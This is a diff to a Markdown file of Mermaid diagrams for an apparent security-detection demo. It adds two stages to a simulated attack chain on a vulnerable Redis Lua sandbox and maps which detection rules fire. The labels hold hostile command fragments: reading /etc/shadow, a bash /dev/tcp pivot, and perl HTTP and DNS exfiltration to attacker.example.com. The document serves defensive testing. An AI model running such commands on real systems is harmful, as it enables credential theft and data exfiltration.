@@ -85,8 +85,10 @@ flowchart LR
 
 ## 3 · The attack chain — one POST per stage, all to the eval endpoint
 
-Single attacker, four sequential HTTP POSTs into the SAME legitimate
+Single attacker, six sequential HTTP POSTs into the SAME legitimate
 endpoint. The variant is the Lua **payload**, not the entry vector.
+Stages 5 + 6 are opt-in (`./scripts/local-ci-chain.sh --extended`);
+stages 1-4 are the default basic chain.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -95,23 +97,30 @@ flowchart TB
   classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
   classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
-  classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
+  classDef ext   fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
 
-  atk(["<b>attacker</b><br/><i>4 × POST /api/cache/eval</i>"]):::warn
+  atk(["<b>attacker</b><br/><i>4-6 × POST /api/cache/eval</i>"]):::warn
 
   s1["<b>s1 · recon</b><br/><i>script: INCR counter</i><br/>blind by design"]:::cmp
   s2["<b>s2 · escape + shadow</b><br/><i>loadlib → io.popen('cat /etc/shadow')</i>"]:::warn
-  s3["<b>s3 · pivot</b><br/><i>io.popen('bash -c &quot;exec 3&lt;&gt;/dev/tcp/chain-postgres/5432&quot;')</i>"]:::warn
+  s3["<b>s3 · pivot</b><br/><i>io.popen('bash -c &quot;exec 3&lt;&gt;/dev/tcp/chain-postgres/5432&quot;')</i><br/>(SSL probe only)"]:::warn
   s4["<b>s4 · exfil</b><br/><i>io.popen('perl IO::Socket → attacker.example.com')</i>"]:::warn
+  s5["<b>s5 · real pg-wire</b><br/><i>perl: Startup + Query + parse DataRow</i><br/>(extracts ROW back)"]:::ext
+  s6["<b>s6 · DNS exfil</b><br/><i>perl: base32(ROW) → getent</i><br/>chunk.attacker.example.com per label"]:::ext
 
   fe["<b>chain-frontend</b><br/><i>RESP proxy to redis</i>"]:::live
   rd["<b>chain-redis</b><br/><i>vulnerable Lua sandbox</i>"]:::ref
+  pg["<b>chain-postgres</b><br/><i>AUTH_METHOD=trust</i>"]:::live
 
   atk --> s1 --> fe
   atk --> s2 --> fe
   atk --> s3 --> fe
   atk --> s4 --> fe
+  atk -. extended .-> s5 -.-> fe
+  atk -. extended .-> s6 -.-> fe
   fe ==>|EVAL| rd
+  rd ==>|pg-wire Startup+Query| pg
+  pg -. DataRow .-> rd
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
@@ -120,8 +129,8 @@ flowchart TB
 
 ## 4 · Where each detection fires (or doesn't)
 
-Same 4 stages, but the focus is now WHICH RULE on WHICH POD. Green = fires,
-red = silent.
+All 6 stages, but the focus is now WHICH RULE on WHICH POD. Green = fires,
+red = silent. Blue stages (s5, s6) are opt-in via `--extended`.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -130,25 +139,33 @@ flowchart LR
   classDef live  fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
   classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
+  classDef ext   fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
   classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
 
   subgraph Stages [" "]
     direction TB
     s1["<b>s1 recon</b>"]:::cmp
     s2["<b>s2 escape + shadow</b>"]:::warn
-    s3["<b>s3 pivot</b>"]:::warn
-    s4["<b>s4 exfil</b>"]:::warn
+    s3["<b>s3 pivot (SSL probe)</b>"]:::warn
+    s4["<b>s4 exfil (HTTP)</b>"]:::warn
+    s5["<b>s5 pg-wire + row</b>"]:::ext
+    s6["<b>s6 DNS exfil row</b>"]:::ext
   end
 
   subgraph Detections [" detections on chain-redis "]
     direction TB
-    r0001a(["<b>R0001 cat</b><br/>unexpected process"]):::ok
-    r0010(["<b>R0010 /etc/shadow</b><br/>sensitive file"]):::ok
-    r0001b(["<b>R0001 bash</b><br/>unexpected process"]):::ok
-    r0011a(["<b>R0011 → postgres</b><br/>unexpected egress"]):::warn
-    r0001c(["<b>R0001 perl</b><br/>unexpected process"]):::ok
-    r0005(["<b>R0005 attacker.example.com</b><br/>DNS anomaly"]):::warn
-    r0011b(["<b>R0011 external:80</b><br/>unexpected egress"]):::warn
+    r0001a(["<b>R0001 cat</b>"]):::ok
+    r0010(["<b>R0010 /etc/shadow</b>"]):::ok
+    r0001b(["<b>R0001 bash</b>"]):::ok
+    r0011a(["<b>R0011 → postgres</b>"]):::warn
+    r0001c(["<b>R0001 perl</b><br/>external</b>"]):::ok
+    r0005a(["<b>R0005 attacker.example.com</b>"]):::warn
+    r0011b(["<b>R0011 external:80</b>"]):::warn
+    r0001d(["<b>R0001 perl</b><br/>pg-wire</b>"]):::ok
+    r0011c(["<b>R0011 → postgres:5432</b>"]):::warn
+    r0001e(["<b>R0001 perl</b><br/>dns-exfil</b>"]):::ok
+    r0005b(["<b>R0005 *.attacker.example.com (×N)</b>"]):::warn
+    r0011d(["<b>R0011 → DNS resolver</b>"]):::warn
   end
 
   s2 ==>|fires| r0001a
@@ -156,8 +173,13 @@ flowchart LR
   s3 ==>|fires| r0001b
   s3 -.->|silent| r0011a
   s4 ==>|fires| r0001c
-  s4 -.->|silent| r0005
+  s4 -.->|silent| r0005a
   s4 -.->|silent| r0011b
+  s5 ==>|fires| r0001d
+  s5 -.->|silent| r0011c
+  s6 ==>|fires| r0001e
+  s6 -.->|silent| r0005b
+  s6 -.->|silent| r0011d
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
@@ -167,7 +189,7 @@ flowchart LR
 ## 5 · The blind-spot map — what two cluster knobs would unblind
 
 Each red detection traces back to one of two operator settings. Flip
-both → demo goes from 4/7 to 7/7.
+both → basic demo goes from 4/7 to 7/7, extended from 6/12 to 12/12.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -175,6 +197,7 @@ flowchart TB
   classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
   classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
+  classDef ext   fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
   classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
 
   k1[["<b>knob 1</b><br/>values.yaml<br/><i>networkEventsStreaming: <b>disable</b></i>"]]:::warn
@@ -183,19 +206,29 @@ flowchart TB
   b1(["R0005 DNS — s4"]):::warn
   b2(["R0011 egress — s3"]):::warn
   b3(["R0011 egress — s4"]):::warn
+  b4(["R0011 egress — s5 (pg-wire)"]):::ext
+  b5(["R0005 DNS — s6 (×N chunks)"]):::ext
+  b6(["R0011 egress — s6 (DNS UDP)"]):::ext
 
   d1(["R0001 cat — s2"]):::ok
   d2(["R0010 /etc/shadow — s2"]):::ok
   d3(["R0001 bash — s3"]):::ok
   d4(["R0001 perl — s4"]):::ok
+  d5(["R0001 perl — s5"]):::ok
+  d6(["R0001 perl — s6"]):::ok
 
   k1 -->|suppresses| b1
   k1 -->|suppresses| b2
   k1 -->|suppresses| b3
+  k1 -->|suppresses| b4
+  k1 -->|suppresses| b5
+  k1 -->|suppresses| b6
   k2 -->|suppresses| b2
   k2 -->|suppresses| b3
+  k2 -->|suppresses| b4
+  k2 -->|suppresses| b6
 
-  d1 ~~~ d2 ~~~ d3 ~~~ d4
+  d1 ~~~ d2 ~~~ d3 ~~~ d4 ~~~ d5 ~~~ d6
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
@@ -205,7 +238,12 @@ flowchart TB
 ## 6 · Sbob contents per pod — why redis is the perfect catch surface
 
 The narrow learned profile on chain-redis (one exec, zero egress) is
-the precondition that makes 4 of 7 detections trigger reliably.
+the precondition that makes 4 of 7 (basic) / 6 of 12 (extended)
+detections trigger reliably. Every comm the attack spawns (cat, bash,
+perl × stages) is novel to the AP → R0001; every outbound destination
+(postgres:5432, attacker.example.com, kube-dns for chunk lookups) is
+novel to the NN → R0011 / R0005 *would* fire if the network knobs
+were on.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -284,10 +322,11 @@ flowchart TB
 
 ---
 
-## 8 · MITRE ATT&CK mapping — kill chain across the 4 stages
+## 8 · MITRE ATT&CK mapping — kill chain across all 6 stages
 
 Same chain, told in TTP language. Each stage maps to one or two MITRE
-techniques and a defensive control.
+techniques and a defensive control. Blue stages (s5, s6) are opt-in
+via `--extended`.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -295,21 +334,29 @@ flowchart LR
   classDef ref   fill:#C3A50D,stroke:#9a8208,color:#0a0a0a,stroke-width:1.4px
   classDef cmp   fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef warn  fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
+  classDef ext   fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
   classDef ok    fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
 
   s1["<b>s1 · Reconnaissance</b><br/><i>T1595 active scan</i>"]:::cmp
   s2["<b>s2 · Initial Access + Discovery</b><br/><i>T1190 exploit public-facing app<br/>T1083 file & dir discovery</i>"]:::warn
-  s3["<b>s3 · Lateral Movement</b><br/><i>T1210 exploit remote service<br/>T1071.001 web protocols</i>"]:::warn
-  s4["<b>s4 · Exfiltration</b><br/><i>T1041 exfil over C2<br/>T1571 non-standard port</i>"]:::warn
+  s3["<b>s3 · Lateral Movement (probe)</b><br/><i>T1210 exploit remote service<br/>T1071.001 web protocols</i>"]:::warn
+  s4["<b>s4 · Exfiltration (HTTP)</b><br/><i>T1041 exfil over C2<br/>T1571 non-standard port</i>"]:::warn
+  s5["<b>s5 · Lateral Movement (data)</b><br/><i>T1210 exploit remote service<br/>T1213 data from info repos</i>"]:::ext
+  s6["<b>s6 · Exfiltration (DNS)</b><br/><i>T1048.003 exfil over alt protocol<br/>T1071.004 DNS protocol</i>"]:::ext
 
   d2["<b>R0001 / R0010</b><br/>process + file rules<br/><i>caught</i>"]:::ok
   d3["<b>R0001</b> caught<br/><b>R0011</b> <i>blind</i>"]:::cmp
   d4["<b>R0001</b> caught<br/><b>R0005 / R0011</b> <i>blind</i>"]:::cmp
+  d5["<b>R0001</b> caught<br/><b>R0011</b> <i>blind</i>"]:::cmp
+  d6["<b>R0001</b> caught<br/><b>R0005 ×N / R0011</b> <i>blind</i>"]:::cmp
 
   s1 --> s2 --> s3 --> s4
+  s4 -. extended .-> s5 --> s6
   s2 -.->|defender| d2
   s3 -.->|defender| d3
   s4 -.->|defender| d4
+  s5 -.->|defender| d5
+  s6 -.->|defender| d6
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
@@ -320,6 +367,7 @@ flowchart LR
 
 Compact grid view of which expected detection landed where. Same data
 as the coverage table the script prints; visual form for slide decks.
+Blue rows (s5, s6) are opt-in via `--extended`.
 
 ```mermaid
 %%{init: {"theme":"base","themeVariables":{"primaryColor":"#C3A50D","primaryTextColor":"#0a0a0a","primaryBorderColor":"#9a8208","lineColor":"#0a0a0a","secondaryColor":"#D43F5B","tertiaryColor":"#fff5d6"}}}%%
@@ -327,6 +375,7 @@ flowchart TB
   classDef warn fill:#D43F5B,stroke:#a03048,color:#fff,stroke-width:1.4px
   classDef ok   fill:#fafaf6,stroke:#0a0a0a,color:#0a0a0a,stroke-width:1px
   classDef cmp  fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
+  classDef ext  fill:#5b9bd5,stroke:#2a5a8a,color:#fff,stroke-width:1.4px
 
   subgraph row_s2 [" s2 · escape + shadow "]
     direction LR
@@ -334,22 +383,35 @@ flowchart TB
     s2_r0010["R0010 ✓"]:::ok
   end
 
-  subgraph row_s3 [" s3 · pivot "]
+  subgraph row_s3 [" s3 · pivot (SSL probe) "]
     direction LR
     s3_r0001["R0001 ✓"]:::ok
     s3_r0011["R0011 ✗"]:::warn
   end
 
-  subgraph row_s4 [" s4 · exfil "]
+  subgraph row_s4 [" s4 · exfil (HTTP) "]
     direction LR
     s4_r0001["R0001 ✓"]:::ok
     s4_r0005["R0005 ✗"]:::warn
     s4_r0011["R0011 ✗"]:::warn
   end
 
-  total[["<b>Coverage 4 / 7</b><br/><i>3 blind ⇒ 2 knobs</i>"]]:::cmp
+  subgraph row_s5 [" s5 · pg-wire + row (extended) "]
+    direction LR
+    s5_r0001["R0001 ✓"]:::ok
+    s5_r0011["R0011 ✗"]:::ext
+  end
 
-  row_s2 ~~~ row_s3 ~~~ row_s4 ~~~ total
+  subgraph row_s6 [" s6 · DNS exfil row (extended) "]
+    direction LR
+    s6_r0001["R0001 ✓"]:::ok
+    s6_r0005["R0005 ✗"]:::ext
+    s6_r0011["R0011 ✗"]:::ext
+  end
+
+  total[["<b>Coverage 4 / 7 basic · 6 / 12 extended</b><br/><i>same 2 knobs unblind everything</i>"]]:::cmp
+
+  row_s2 ~~~ row_s3 ~~~ row_s4 ~~~ row_s5 ~~~ row_s6 ~~~ total
 
   linkStyle default stroke:#7a808c,stroke-width:1.2px
 ```
@@ -370,7 +432,7 @@ flowchart LR
   classDef cmp  fill:#fff5d6,stroke:#9a8208,color:#0a0a0a,stroke-width:1.2px
   classDef live fill:#0a0a0a,stroke:#0a0a0a,color:#fff,stroke-width:1.4px
 
-  subgraph defaults [" defaults today "]
+  subgraph defaults [" defaults today (extended chain) "]
     direction TB
     a1["s2 R0001 cat ✓"]:::ok
     a2["s2 R0010 shadow ✓"]:::ok
@@ -379,8 +441,13 @@ flowchart LR
     a5["s4 R0001 perl ✓"]:::ok
     a6["s4 R0005 DNS ✗"]:::warn
     a7["s4 R0011 egress ✗"]:::warn
-    cov_a[["<b>4 / 7</b>"]]:::cmp
-    a1 ~~~ a2 ~~~ a3 ~~~ a4 ~~~ a5 ~~~ a6 ~~~ a7 ~~~ cov_a
+    a8["s5 R0001 perl ✓"]:::ok
+    a9["s5 R0011 egress ✗"]:::warn
+    a10["s6 R0001 perl ✓"]:::ok
+    a11["s6 R0005 DNS ×N ✗"]:::warn
+    a12["s6 R0011 egress ✗"]:::warn
+    cov_a[["<b>6 / 12 extended</b><br/><i>4 / 7 basic</i>"]]:::cmp
+    a1 ~~~ a2 ~~~ a3 ~~~ a4 ~~~ a5 ~~~ a6 ~~~ a7 ~~~ a8 ~~~ a9 ~~~ a10 ~~~ a11 ~~~ a12 ~~~ cov_a
   end
 
   switch["⚙️ flip 2 knobs<br/><i>networkEventsStreaming: enable</i><br/><i>R0011.isTriggerAlert: true</i>"]:::live
@@ -394,8 +461,13 @@ flowchart LR
     b5["s4 R0001 perl ✓"]:::ok
     b6["s4 R0005 DNS ✓"]:::ok
     b7["s4 R0011 egress ✓"]:::ok
-    cov_b[["<b>7 / 7</b>"]]:::ok
-    b1 ~~~ b2 ~~~ b3 ~~~ b4 ~~~ b5 ~~~ b6 ~~~ b7 ~~~ cov_b
+    b8["s5 R0001 perl ✓"]:::ok
+    b9["s5 R0011 egress ✓"]:::ok
+    b10["s6 R0001 perl ✓"]:::ok
+    b11["s6 R0005 DNS ×N ✓"]:::ok
+    b12["s6 R0011 egress ✓"]:::ok
+    cov_b[["<b>12 / 12 extended</b><br/><i>7 / 7 basic</i>"]]:::ok
+    b1 ~~~ b2 ~~~ b3 ~~~ b4 ~~~ b5 ~~~ b6 ~~~ b7 ~~~ b8 ~~~ b9 ~~~ b10 ~~~ b11 ~~~ b12 ~~~ cov_b
   end
 
   defaults --> switch --> flipped
